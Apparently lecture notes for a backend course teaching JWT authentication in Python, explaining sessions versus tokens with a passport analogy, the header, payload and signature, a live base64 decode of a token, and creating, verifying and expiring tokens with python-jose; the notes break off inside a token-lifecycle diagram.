# LECTURE DESIGN PHILOSOPHY

```
┌─────────────────────────────────────────────────────────────────┐
│                    PEDAGOGICAL APPROACH                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  GAP FIRST, SOLUTION SECOND                                     │
│  ──────────────────────────                                     │
│  Students built login in Lecture 1. It verifies the password.   │
│  Then... returns nothing useful. Make them feel THAT gap.       │
│                                                                 │
│  ANALOGY-DRIVEN                                                 │
│  ──────────────                                                 │
│  JWT is abstract. We use a passport analogy throughout.         │
│  Every concept maps to something students have held in          │
│  their hands at an airport.                                     │
│                                                                 │
│  SECURITY INTUITION BEFORE CODE                                 │
│  ─────────────────────────────                                  │
│  Students must understand what JWT protects — and what it       │
│  does NOT — before writing a single line of python-jose.        │
│  We will crack open a JWT live and read its "secret" payload.   │
│                                                                 │
│  CONNECT TO PRIOR LECTURES                                      │
│  ─────────────────────────                                      │
│  Lecture 1 (login flow) → now returns something useful          │
│  Week 3 (Pydantic) → response models for token endpoints       │
│  Week 3 (REST statelessness) → the reason tokens exist         │
│  Week 3 (HTTPException) → auth error responses                  │
│  Week 6 (Async SQLAlchemy) → looking up users from token data  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# LECTURE OUTLINE

```
┌─────────────────────────────────────────────────────────────────┐
│                    JWT AUTHENTICATION                           │
│                     (3–4 Hour Lecture)                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PART 1: THE PROBLEM (40 min)                                   │
│  ├─ 1.1 Where Lecture 1 Left Us                                 │
│  ├─ 1.2 HTTP is Stateless (The Amnesia Problem)                 │
│  ├─ 1.3 Session-Based Auth (Server Remembers)                   │
│  ├─ 1.4 Token-Based Auth (Client Carries Proof)                 │
│  └─ 1.5 The Passport Analogy                                    │
│                                                                 │
│  PART 2: JWT ANATOMY (45 min)                                   │
│  ├─ 2.1 The Three Parts                                         │
│  ├─ 2.2 Header (The Format Label)                               │
│  ├─ 2.3 Payload — Claims (Your Information)                     │
│  ├─ 2.4 Signature (The Tamper Seal)                             │
│  └─ 2.5 Base64 is NOT Encryption (Live Demonstration)           │
│                                                                 │
│  PART 3: JWT IN PYTHON (60 min)                                 │
│  ├─ 3.1 python-jose Setup                                       │
│  ├─ 3.2 Creating Tokens (jwt.encode)                            │
│  ├─ 3.3 Decoding Tokens (jwt.decode)                            │
│  ├─ 3.4 Token Expiration (exp Claim + timedelta)                │
│  ├─ 3.5 Handling Invalid Tokens (JWTError, ExpiredSignature)    │
│  └─ 3.6 Completing the Login Endpoint (Lecture 1 → Tokens)      │
│                                                                 │
│  PART 4: ACCESS & REFRESH TOKENS (45 min)                       │
│  ├─ 4.1 The Single Token Problem                                │
│  ├─ 4.2 Two Tokens, Two Jobs                                    │
│  ├─ 4.3 The Complete Flow (Diagram)                             │
│  ├─ 4.4 Building the Token Pair                                 │
│  ├─ 4.5 The Refresh Endpoint                                    │
│  └─ 4.6 Token Rotation (Detecting Theft)                        │
│                                                                 │
│  PART 5: CLIENT-SIDE STORAGE & SECURITY (30 min)                │
│  ├─ 5.1 Where Tokens Live (Client-Side Reality)                 │
│  ├─ 5.2 Storage Options Compared                                │
│  ├─ 5.3 Attack Awareness (XSS, Token Theft)                     │
│  └─ 5.4 Security Checklist                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 1: THE PROBLEM

## 1.1 Where Lecture 1 Left Us

**Start by showing the gap. Pull up the code they wrote last lecture.**

```python
# This is where Lecture 1 ended.
# We can register a user and verify their password. Great.
# But look at the login endpoint:

@app.post("/auth/login")
async def login(
    credentials: LoginRequest,
    db: AsyncSession = Depends(get_db),
):
    user = await user_repo.get_by_email(db, credentials.email)
    
    if not user or not verify_password(credentials.password, user.hashed_password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    # ✅ We verified the user. They are who they claim to be.
    # ❓ But NOW what do we return?
    return {"message": "Login successful"}  # ← THIS IS USELESS
```

**Now show the next endpoint that needs the logged-in user:**

```python
@app.get("/tasks")
async def get_my_tasks(
    db: AsyncSession = Depends(get_db),
):
    # Whose tasks?
    # HOW DO WE KNOW WHO IS MAKING THIS REQUEST?
    # We can't ask for their password again!
    
    user_id = ???  # ← This is the entire problem.
    
    tasks = await task_repo.get_by_user(db, user_id)
    return tasks
```

**Ask the class:**

> "You verified the user's password on `/auth/login`. They got back `{'message': 'Login successful'}`. Now they call `GET /tasks`. How does the server know who they are? Do we ask for their password with every single request?"

Answer: **Obviously not. Nobody does that. But HTTP doesn't remember who you are between requests.**

---

## 1.2 HTTP is Stateless (The Amnesia Problem)

**Recall what you learned in Week 3 — REST principles include statelessness:**

> "In Week 3, we said REST is stateless: the server stores no memory of previous requests. Every request must carry everything the server needs to process it. That was a design feature. Now it's our problem."

```
┌─────────────────────────────────────────────────────────────────┐
│                     THE AMNESIA PROBLEM                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  REQUEST 1: POST /auth/login                                    │
│  ┌────────┐                              ┌────────┐            │
│  │ Client │ ── email + password ────────▶ │ Server │            │
│  │        │ ◀── "Login successful" ────── │        │            │
│  └────────┘                              └────────┘            │
│                                          Server: "OK, valid."  │
│                                          Server: *forgets*     │
│                                                                 │
│  REQUEST 2: GET /tasks                                          │
│  ┌────────┐                              ┌────────┐            │
│  │ Client │ ── ??? ─────────────────────▶ │ Server │            │
│  │        │                              │        │            │
│  └────────┘                              └────────┘            │
│                                          Server: "Who are you?"│
│                                                                 │
│  HTTP has no memory. Every request starts from scratch.         │
│  The server has complete amnesia between requests.              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**The question is not "how do we identify the user?" The question is: "how does the client PROVE its identity on every request, without sending the password every time?"**

There are two fundamentally different approaches.

---

## 1.3 Session-Based Auth (Server Remembers)

**The classic web approach — the server keeps a memory:**

```
┌─────────────────────────────────────────────────────────────────┐
│                   SESSION-BASED AUTH                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STEP 1: Login                                                  │
│  ┌────────┐                              ┌────────┐            │
│  │ Client │ ── email + password ────────▶ │ Server │            │
│  │        │ ◀── Cookie: session_id=abc ── │        │            │
│  └────────┘                              └────┬───┘            │
│                                               │                │
│                                               ▼                │
│                                        ┌─────────────┐         │
│                                        │ Session DB   │         │
│                                        ├─────────────┤         │
│                                        │ abc → user42 │         │
│                                        │ def → user17 │         │
│                                        │ ghi → user99 │         │
│                                        └─────────────┘         │
│                                                                 │
│  STEP 2: Subsequent Request                                     │
│  ┌────────┐                              ┌────────┐            │
│  │ Client │ ── Cookie: session_id=abc ──▶│ Server │            │
│  │        │ ◀── your tasks ────────────── │        │            │
│  └────────┘                              └────┬───┘            │
│                                               │                │
│                                               ▼                │
│                                        ┌─────────────┐         │
│                                        │ Session DB   │         │
│                                        │ lookup "abc" │         │
│                                        │  → user42 ✓  │         │
│                                        └─────────────┘         │
│                                                                 │
│  The session ID is MEANINGLESS on its own.                      │
│  It's just a random string. The server must LOOK IT UP          │
│  every single time.                                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Sessions work. Traditional web apps use them. But they have costs:**

```
┌─────────────────────────────────────────────────────────────────┐
│                  SESSION TRADEOFFS                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✅ PROS:                                                       │
│  ├─ Easy to revoke (delete from session store)                  │
│  ├─ Server has full control over active sessions                │
│  └─ Session data stored securely on the server                  │
│                                                                 │
│  ❌ CONS:                                                       │
│  ├─ Server must store EVERY active session                      │
│  │   └─ 100,000 users = 100,000 session records                │
│  ├─ Every request requires a session DB lookup                  │
│  │   └─ Extra latency, extra load                               │
│  ├─ Hard to scale horizontally                                  │
│  │   └─ If Server A stores the session, Server B doesn't        │
│  │       know about it (sticky sessions, shared store)          │
│  ├─ Tightly couples client to one server (or shared store)      │
│  └─ Not ideal for APIs consumed by mobile apps, SPAs, etc.      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 1.4 Token-Based Auth (Client Carries Proof)

**The API approach — the client carries self-contained proof:**

```
┌─────────────────────────────────────────────────────────────────┐
│                   TOKEN-BASED AUTH                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STEP 1: Login                                                  │
│  ┌────────┐                              ┌────────┐            │
│  │ Client │ ── email + password ────────▶ │ Server │            │
│  │        │ ◀── token: eyJhbGci... ────── │        │            │
│  └────────┘                              └────────┘            │
│       │                                                         │
│       │  Client stores the token                                │
│       ▼                                  NO session stored      │
│  ┌──────────┐                            on the server!         │
│  │ "eyJhb.. │                                                   │
│  │  GciOi.. │                                                   │
│  │  J9..."  │                                                   │
│  └──────────┘                                                   │
│                                                                 │
│  STEP 2: Subsequent Request                                     │
│  ┌────────┐                              ┌────────┐            │
│  │ Client │ ── Header: Bearer eyJhb... ─▶│ Server │            │
│  │        │ ◀── your tasks ────────────── │        │            │
│  └────────┘                              └────────┘            │
│                                               │                │
│                                               ▼                │
│                                        ┌─────────────┐         │
│                                        │ Verify the  │         │
│                                        │ SIGNATURE   │         │
│                                        │ (no DB hit) │         │
│                                        └─────────────┘         │
│                                                                 │
│  The token IS the proof. The server doesn't look anything up.   │
│  It verifies the token's signature using its secret key.        │
│  If the signature is valid → the token was issued by this       │
│  server and hasn't been tampered with.                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Ask the class:**

> "With sessions, the server had to remember every logged-in user. With tokens, the server remembers *nothing*. The token itself carries the user's identity, and the server just verifies it wasn't forged. Which approach is truly stateless in the REST sense?"

Answer: **Token-based auth. The server stores no state between requests. That's pure REST.**

---

## 1.5 The Passport Analogy

**This analogy will carry us through the entire lecture.**

```
┌─────────────────────────────────────────────────────────────────┐
│                   THE PASSPORT ANALOGY                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SESSION-BASED = VISITOR BADGE                                  │
│  ─────────────────────────────                                  │
│                                                                 │
│  1. You arrive at a corporate building (login)                  │
│  2. Reception gives you badge #4532                             │
│  3. You go to a meeting room (API request)                      │
│  4. The guard CALLS reception: "Is #4532 allowed?" ← DB lookup │
│  5. Reception checks their list: "Yes" → You enter              │
│  6. Every room, every time, guard calls reception               │
│                                                                 │
│  If reception's phone line goes down → NOBODY gets in.          │
│  If the building opens a second reception desk, they need       │
│  to share the same badge list.                                  │
│                                                                 │
│                                                                 │
│  TOKEN-BASED (JWT) = PASSPORT                                   │
│  ────────────────────────────                                   │
│                                                                 │
│  1. You visit the embassy (login to auth server)                │
│  2. Embassy verifies your identity (checks password)            │
│  3. Embassy issues a PASSPORT with:                             │
│     ├─ Your name, nationality, photo (payload data)             │
│     ├─ An expiration date (exp claim)                           │
│     └─ An official holographic seal (signature)                 │
│  4. You arrive at border control (API request)                  │
│  5. Agent reads your passport and checks the seal               │
│     └─ NO phone call to the embassy!                            │
│  6. If the seal is valid → you're in                            │
│                                                                 │
│  Anyone can READ your passport (name is visible).               │
│  But nobody can FORGE one without the embassy's stamp.          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Map the analogy to programming:**

```
┌──────────────────────────┬──────────────────────────────────────┐
│  Passport World          │  JWT World                           │
├──────────────────────────┼──────────────────────────────────────┤
│  Embassy                 │  Your auth server (login endpoint)   │
│  Passport                │  JWT (the token string)              │
│  Your name/nationality   │  Payload (user_id, role, email)      │
│  Passport format (book)  │  Header (algorithm, token type)      │
│  Holographic seal        │  Signature (HMAC with secret key)    │
│  Expiration date         │  exp claim (token TTL)               │
│  Border agent            │  Any server endpoint that checks it  │
│  Stamp mold (secret)     │  SECRET_KEY (only server knows it)   │
│  Stolen passport         │  Stolen token (valid until expired!) │
│  Passport renewal        │  Refresh token flow                  │
└──────────────────────────┴──────────────────────────────────────┘
```

**The insight:**

> "A passport doesn't call home to verify you. It's *self-contained*. JWT works the same way. The token itself carries everything the server needs to trust you — as long as the signature checks out."

---

# PART 2: JWT ANATOMY

## 2.1 The Three Parts

**JWT stands for JSON Web Token. It has exactly three parts, separated by dots.**

```
┌─────────────────────────────────────────────────────────────────┐
│                     JWT STRUCTURE                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  A JWT looks like this:                                         │
│                                                                 │
│  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzQyIn0.SflKxwRJSMeKKF │
│  ─────────┬──────────  ──────────┬─────────────  ──────┬─────── │
│           │                      │                     │        │
│        HEADER                 PAYLOAD              SIGNATURE    │
│                                                                 │
│  Three parts. Three dots-separated Base64 strings.              │
│  That's it. That's the entire format.                           │
│                                                                 │
│  ┌──────────┐   ┌──────────────┐   ┌─────────────────┐         │
│  │  HEADER  │ . │   PAYLOAD    │ . │   SIGNATURE     │         │
│  │          │   │              │   │                 │         │
│  │ How it's │   │ Who you are  │   │ Proof it's not  │         │
│  │ signed   │   │ + metadata   │   │ tampered with   │         │
│  └──────────┘   └──────────────┘   └─────────────────┘         │
│                                                                 │
│  🛂 Passport:  │  📋 Passport:    │  🔒 Passport:              │
│  Booklet type  │  Name, DOB,      │  Holographic               │
│  & country     │  nationality     │  seal                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2.2 Header (The Format Label)

**The header tells the server HOW the token was signed.**

```
┌─────────────────────────────────────────────────────────────────┐
│                       JWT HEADER                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Decoded JSON:                                                  │
│                                                                 │
│  {                                                              │
│    "alg": "HS256",     ← Algorithm used to create signature    │
│    "typ": "JWT"        ← Type of token                         │
│  }                                                              │
│                                                                 │
│  That's almost always all that's in the header.                 │
│                                                                 │
│  Common algorithms:                                             │
│  ├─ HS256 — HMAC with SHA-256 (symmetric: ONE secret key)      │
│  │          ✅ We'll use this. Simple. One server.              │
│  ├─ RS256 — RSA with SHA-256 (asymmetric: public/private pair) │
│  │          Used when multiple services verify tokens.          │
│  └─ none  — No signature at all                                │
│             ❌ NEVER use this. Tokens can be forged freely.     │
│                                                                 │
│  🛂 Passport equivalent: The booklet format.                    │
│     All passports follow a standard layout so any border        │
│     agent in any country can read them.                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "For this course, we use HS256 — one secret key shared by the server that creates the token and the server that verifies it. Since our backend is a single application, this is perfect. RS256 matters when you have multiple separate services that need to verify tokens independently — that's microservice territory, not where we are right now."

---

## 2.3 Payload — Claims (Your Information)

**The payload is where the actual user data lives. Each field is called a "claim."**

```
┌─────────────────────────────────────────────────────────────────┐
│                      JWT PAYLOAD                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Decoded JSON:                                                  │
│                                                                 │
│  {                                                              │
│    "sub": "user_42",                ← Subject: WHO this is for │
│    "exp": 1709283200,               ← Expiration: WHEN it dies │
│    "iat": 1709282300,               ← Issued At: WHEN created  │
│    "type": "access"                 ← Custom: our own field    │
│  }                                                              │
│                                                                 │
│                                                                 │
│  STANDARD CLAIMS (defined by the JWT spec):                     │
│  ├─ "sub" (subject)    — Identifies the user. Usually user ID. │
│  ├─ "exp" (expiration)  — Unix timestamp. Token dies after this.│
│  ├─ "iat" (issued at)   — Unix timestamp. When token was made. │
│  ├─ "iss" (issuer)      — Who issued it. (e.g., your server)   │
│  └─ "aud" (audience)    — Who it's intended for. (e.g., client)│
│                                                                 │
│  CUSTOM CLAIMS (we define these ourselves):                     │
│  ├─ "type"  — "access" or "refresh" (critical! explained later)│
│  ├─ "role"  — "admin", "member", etc. (for RBAC in Lecture 3)  │
│  └─ anything else your application needs                        │
│                                                                 │
│  🛂 Passport equivalent: Your name, date of birth, nationality,│
│     passport number, expiration date. All printed on the page.  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Why "sub" and not "user_id"?**

> "The JWT specification defines standard claim names. `sub` is the standard name for 'subject' — the entity the token is about. You *could* use `user_id`, but `sub` is the convention. Libraries and tools expect it. Use `sub`."

**A critical point about what to put in the payload:**

```
┌─────────────────────────────────────────────────────────────────┐
│                  WHAT GOES IN THE PAYLOAD?                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✅ PUT IN PAYLOAD:               ❌ NEVER PUT IN PAYLOAD:     │
│  ├─ User ID (sub)                 ├─ Passwords                  │
│  ├─ Expiration time               ├─ Credit card numbers        │
│  ├─ Token type                    ├─ Social security numbers    │
│  ├─ User role (if needed)         ├─ API keys or secrets        │
│  └─ Issued-at timestamp           └─ Any sensitive PII          │
│                                                                 │
│  WHY? Because the payload is NOT encrypted.                     │
│  Anyone who has the token can READ every field.                 │
│  (We'll prove this in Section 2.5)                              │
│                                                                 │
│  Rule: Only put information you'd be comfortable printing       │
│        on the OUTSIDE of an envelope.                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2.4 Signature (The Tamper Seal)

**The signature is what makes JWT trustworthy.**

```
┌─────────────────────────────────────────────────────────────────┐
│                      JWT SIGNATURE                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  HOW THE SIGNATURE IS CREATED:                                  │
│                                                                 │
│  ┌────────────────────┐                                         │
│  │ Base64(header)     │─── "eyJhbGci..."                       │
│  └─────────┬──────────┘                                         │
│            │           ┌─── "." (literal dot)                   │
│            │           │                                        │
│  ┌─────────┴──────────┐│                                        │
│  │ Base64(payload)    │┘── "eyJzdWIi..."                       │
│  └─────────┬──────────┘                                         │
│            │                                                    │
│            ▼                                                    │
│  ┌──────────────────────────────────────────┐                   │
│  │ HMAC-SHA256(                             │                   │
│  │   base64(header) + "." + base64(payload),│                   │
│  │   SECRET_KEY    ◀── Only the server knows│                   │
│  │ )                                        │                   │
│  └─────────────────────┬────────────────────┘                   │
│                        │                                        │
│                        ▼                                        │
│              ┌──────────────────┐                                │
│              │ SIGNATURE bytes  │── "SflKxwRJ..."               │
│              └──────────────────┘                                │
│                                                                 │
│                                                                 │
│  HOW VERIFICATION WORKS:                                        │
│                                                                 │
│  Server receives token → splits into 3 parts →                  │
│  re-computes signature using header + payload + its SECRET_KEY →│
│  compares with the signature in the token.                      │
│                                                                 │
│  Match?     → Token is authentic, not tampered with. ✅         │
│  No match?  → Token was forged or modified. ❌ Reject it.       │
│                                                                 │
│  🛂 Passport equivalent: The holographic seal.                  │
│     You can READ the passport without the seal.                 │
│     But you can't FORGE the seal without the embassy's mold.    │
│     If the seal is broken → passport is invalid.                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**What happens if someone tampers with the payload?**

```
┌─────────────────────────────────────────────────────────────────┐
│                   TAMPER DETECTION                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ORIGINAL TOKEN (server created):                               │
│  ┌─────────────┬──────────────────────┬──────────────┐          │
│  │ header      │ {"sub":"user_42",    │ VALID_SIG    │          │
│  │             │  "role":"member"}    │ (matches)    │          │
│  └─────────────┴──────────────────────┴──────────────┘          │
│                                                                 │
│  Server verifies: recompute sig from header+payload             │
│  Recomputed sig == VALID_SIG? ✅ YES → Token accepted           │
│                                                                 │
│                                                                 │
│  ATTACKER modifies payload:                                     │
│  ┌─────────────┬──────────────────────┬──────────────┐          │
│  │ header      │ {"sub":"user_42",    │ VALID_SIG    │          │
│  │             │  "role":"admin"} ◀── │ (stale!)     │          │
│  └─────────────┴───────┬──────────────┴──────────────┘          │
│                        │                                        │
│                  Changed "member"                                │
│                  to "admin"                                      │
│                                                                 │
│  Server verifies: recompute sig from header+MODIFIED payload    │
│  Recomputed sig == VALID_SIG? ❌ NO → REJECTED                  │
│                                                                 │
│  The signature was computed over the ORIGINAL payload.           │
│  Changing even one character in the payload breaks it.           │
│  The attacker can't recompute the signature because             │
│  they don't know the SECRET_KEY.                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2.5 Base64 is NOT Encryption (Live Demonstration)

**This is the single most important security insight of this lecture. Demonstrate it live.**

> "I'm about to shatter an illusion. Most beginners assume that because a JWT looks like random gibberish — `eyJhbGci...` — it must be encrypted. It is NOT."

```python
# LIVE DEMO: Crack open a JWT with nothing but the standard library.
# No secret key. No library. Just base64.

import base64
import json

# This is a real JWT. Imagine you intercepted it from the network.
token = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    "."
    "eyJzdWIiOiJ1c2VyXzQyIiwiZW1haWwiOiJhbGljZUBleGFtcGxlLm"
    "NvbSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcwOTI4MzIwMH0"
    "."
    "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)

# Split on dots
header_b64, payload_b64, signature_b64 = token.split(".")

# Decode the HEADER — no key needed!
header_bytes = base64.urlsafe_b64decode(header_b64 + "==")
header = json.loads(header_bytes)
print("HEADER:", json.dumps(header, indent=2))

# Decode the PAYLOAD — no key needed!
payload_bytes = base64.urlsafe_b64decode(payload_b64 + "==")
payload = json.loads(payload_bytes)
print("PAYLOAD:", json.dumps(payload, indent=2))
```

**Output:**

```
HEADER: {
  "alg": "HS256",
  "typ": "JWT"
}
PAYLOAD: {
  "sub": "user_42",
  "email": "alice@example.com",
  "role": "admin",
  "exp": 1709283200
}
```

**Pause. Let the class stare at it.**

> "I just read Alice's user ID, email, and role. No secret key. No decryption. No hacking. Just a base64 decode — something any first-year CS student can do. Anybody on the network who intercepts this token knows everything in the payload."

```
┌─────────────────────────────────────────────────────────────────┐
│               BASE64 ≠ ENCRYPTION                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  BASE64 ENCODING:                                               │
│  ─────────────────                                              │
│  • Transforms bytes into text-safe characters                   │
│  • 100% reversible by ANYONE                                    │
│  • No key required. No secret. Just a format.                   │
│  • Purpose: transport binary data in text-based formats         │
│    (HTTP headers, JSON, URLs)                                   │
│                                                                 │
│  ENCRYPTION:                                                    │
│  ───────────                                                    │
│  • Transforms data so ONLY key-holders can read it              │
│  • Requires a key to decrypt                                    │
│  • Purpose: hide the content from everyone except the recipient │
│                                                                 │
│                                                                 │
│  JWT uses base64 encoding. NOT encryption.                      │
│                                                                 │
│  ┌─────────────────────────────────────────────────────┐        │
│  │ THE SIGNATURE DOESN'T HIDE THE DATA.                │        │
│  │ IT PROVES THE DATA HASN'T BEEN CHANGED.             │        │
│  │                                                     │        │
│  │ Your passport is readable by anyone.                │        │
│  │ The holographic seal doesn't make the text invisible.│        │
│  │ It just proves nobody replaced the photo.           │        │
│  └─────────────────────────────────────────────────────┘        │
│                                                                 │
│  IMPLICATION: Never put secrets in JWT payload.                  │
│  Treat it as PUBLIC information that happens to be tamper-proof.│
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "So if anyone can read it, what's the point of the signature?"

Answer: **The signature doesn't protect *confidentiality* (who can read it). It protects *integrity* (nobody can modify it) and *authenticity* (it came from your server).**

---

# PART 3: JWT IN PYTHON

## 3.1 python-jose Setup

**We'll use `python-jose`, a widely used JWT library with a clean API.**

```bash
# Install with the cryptography backend
pip install "python-jose[cryptography]"
```

> "You'll add this to your `pyproject.toml` or `requirements.txt` — same workflow from Week 1."

**The two things you need before creating tokens:**

```python
# config.py — or wherever you keep settings

# 1. A SECRET KEY: random, long, and NEVER committed to git.
#    Generate one like this (run once in terminal):
#    python -c "import secrets; print(secrets.token_hex(32))"
#    Output: "a3f2b8c91d4e7f0a6b5c8d9e2f1a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0"

SECRET_KEY = "your-secret-key-here"  # In production: from environment variable!

# 2. The ALGORITHM: HS256 for symmetric signing.
ALGORITHM = "HS256"
```

```
┌─────────────────────────────────────────────────────────────────┐
│                   ⚠️ SECRET KEY RULES                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✅ DO:                                                         │
│  ├─ Generate with secrets.token_hex(32) — at least 256 bits    │
│  ├─ Store in environment variable (os.getenv, pydantic-settings)│
│  ├─ Use a different key per environment (dev, staging, prod)    │
│  └─ Treat like a database password — never share                │
│                                                                 │
│  ❌ DON'T:                                                      │
│  ├─ Use "secret" or "password123" — attacker guesses it         │
│  ├─ Commit to git — EVER                                        │
│  ├─ Use the same key for access and refresh tokens              │
│  │   (we'll address this in Part 4)                             │
│  └─ Hardcode in production source code                          │
│                                                                 │
│  🛂 This key is the embassy's stamp mold. If someone steals it,│
│     they can forge unlimited valid passports.                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3.2 Creating Tokens (jwt.encode)

**Creating a JWT is one function call:**

```python
from jose import jwt

SECRET_KEY = "a3f2b8c91d4e7f0a6b5c8d9e2f1a3b4c"  # demo only
ALGORITHM = "HS256"

# The payload — what we want inside the token
payload = {
    "sub": "user_42",       # Who this token is for
    "role": "member",       # Custom claim
}

# Create the token
token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

print(token)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQy...
print(type(token))
# <class 'str'>
```

**What just happened?**

```
┌─────────────────────────────────────────────────────────────────┐
│                    jwt.encode() INTERNALS                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  jwt.encode(payload, SECRET_KEY, algorithm="HS256")             │
│      │                                                          │
│      ├─ 1. Creates header: {"alg": "HS256", "typ": "JWT"}      │
│      ├─ 2. JSON-serializes the header → base64url encodes it   │
│      ├─ 3. JSON-serializes the payload → base64url encodes it  │
│      ├─ 4. Concatenates: base64(header) + "." + base64(payload)│
│      ├─ 5. Signs that string with HMAC-SHA256 + SECRET_KEY     │
│      ├─ 6. Base64url encodes the signature                     │
│      └─ 7. Returns: header.payload.signature                   │
│                                                                 │
│  Input:  Python dict + secret key                               │
│  Output: A single string like "eyJhb...xyz"                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**The function signature with type hints:**

```python
# What jwt.encode looks like (simplified):
def encode(
    claims: dict,          # The payload data
    key: str,              # Your secret key
    algorithm: str = ...,  # Signing algorithm
) -> str:                  # Returns the token string
    ...
```

---

## 3.3 Decoding Tokens (jwt.decode)

**Decoding verifies the signature AND returns the payload:**

```python
from jose import jwt

# The token we created above
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6Im1lbWJlciJ9.xxxxx"

# Decode (and verify!)
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

print(payload)
# {"sub": "user_42", "role": "member"}
```

**CRITICAL: `algorithms` is a LIST, not a string:**

```python
# ❌ WRONG: string — this is a security vulnerability!
payload = jwt.decode(token, SECRET_KEY, algorithms="HS256")

# ✅ CORRECT: list — explicitly declare which algorithms you accept
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
```

> "Why a list? Because JWT tokens carry their algorithm in the header. An attacker could change the header to `alg: none` — meaning 'no signature needed' — and the server might blindly accept it. By providing an explicit list of accepted algorithms, you tell the library: 'Only accept HS256. Reject everything else.' This is defense against **algorithm confusion attacks**."

**What decode does under the hood:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    jwt.decode() INTERNALS                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  jwt.decode(token, SECRET_KEY, algorithms=["HS256"])            │
│      │                                                          │
│      ├─ 1. Split the token on "." → header, payload, signature │
│      ├─ 2. Decode header → check algorithm is in allowed list   │
│      ├─ 3. Recompute signature using header + payload + key     │
│      ├─ 4. Compare recomputed signature with token's signature  │
│      │      └─ Mismatch? → raise JWTError                      │
│      ├─ 5. Check exp claim → is the token expired?              │
│      │      └─ Expired? → raise ExpiredSignatureError           │
│      └─ 6. Return the payload as a Python dict                  │
│                                                                 │
│  If this function returns without raising → the token is:       │
│  ✅ Authentic (signature matches our secret key)                │
│  ✅ Unmodified (payload hasn't been tampered with)              │
│  ✅ Not expired (exp is in the future)                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3.4 Token Expiration (exp Claim + timedelta)

**Tokens without expiration are like passports that never expire — if stolen, they work forever.**

```python
from datetime import datetime, timedelta, timezone
from jose import jwt

SECRET_KEY = "your-secret-key"
ALGORITHM = "HS256"

# Create a token that expires in 15 minutes
now = datetime.now(timezone.utc)
expire = now + timedelta(minutes=15)

payload = {
    "sub": "user_42",
    "exp": expire,        # ← python-jose converts datetime to unix timestamp
    "iat": now,            # ← When this token was issued
}

token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
```

**`datetime.now(timezone.utc)` — not `datetime.utcnow()`:**

```python
# ❌ DEPRECATED in Python 3.12+:
now = datetime.utcnow()        # Returns naive datetime (no timezone info)

# ✅ CORRECT — always use timezone-aware:
now = datetime.now(timezone.utc)  # Returns aware datetime with UTC timezone
```

> "JWT expiration works in UTC. Always. The `exp` claim is a Unix timestamp (seconds since 1970-01-01 UTC). Using timezone-aware datetimes avoids a whole class of subtle bugs where your server's local timezone causes tokens to expire at wrong times."

**What happens when a token expires?**

```python
import asyncio

# Create a token that expires in 2 seconds (for demonstration)
payload = {
    "sub": "user_42",
    "exp": datetime.now(timezone.utc) + timedelta(seconds=2),
}

token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

# Decode immediately — works fine
data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
print(data["sub"])  # "user_42" ✅

# Wait 3 seconds...
import time
time.sleep(3)

# Try to decode again
data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
# 💥 jose.ExpiredSignatureError: Signature has expired
```

```
┌─────────────────────────────────────────────────────────────────┐
│                  TOKEN LIFECYCLE                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Created         15 min later             After expiration      │
│  (iat)           (exp)                                          │
│     │               │                        │                  │
│     ▼               ▼                        ▼                  │
